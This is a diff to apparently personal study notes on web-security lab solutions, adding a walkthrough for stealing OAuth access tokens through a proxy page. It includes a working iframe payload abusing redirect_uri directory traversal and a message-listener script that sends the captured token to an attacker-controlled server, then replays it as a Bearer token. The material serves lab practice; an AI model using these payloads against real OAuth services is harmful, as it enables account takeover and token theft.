@@ -5035,7 +5035,30 @@ Response: Communication timed out. (chunked size is 5)
     The else part occurs after the user is redirected back with the token in the URL fragment. Since fragments are not sent in HTTP requests, the attacker uses JavaScript to move the token into the query string (which is sent to the server), thus "stealing" the 
     token and sending it to the attacker's server.
     ```
-- ddd
+- Stealing OAuth access tokens via a proxy page
+  - View post. it allows messages to be posted to any origin (*).
+    ```
+    GET /post/comment/comment-form
+
+    Response
+           <script>
+            parent.postMessage({type: 'onload', data: window.location.href}, '*')
+            function submitForm(form, ev) {
+                ev.preventDefault();
+                const formData = new FormData(document.getElementById("comment-form"));
+                const hashParams = new URLSearchParams(window.location.hash.substr(1));
+    ```
+  -  Exploit server: Use directory traversal to change the redirect_uri so that it points to the comment form. Below this, add a suitable script that will listen for web messages and output the contents somewhere.
+    ```
+    <iframe src="https://oauth-YOUR-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=YOUR-LAB-CLIENT_ID&redirect_uri=https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post/comment/comment-form&response_type=token&nonce=-1552239120&scope=openid%20profile%20email"></iframe>
+
+	<script>
+	    window.addEventListener('message', function(e) {
+	        fetch("/" + encodeURIComponent(e.data.data))
+	    }, false)
+	</script>
+    ```
+  - GET /me > repeater > replace the token in the authorization: Bearer
 
 ## JWT Attacks
 Content for JWT Attacks...
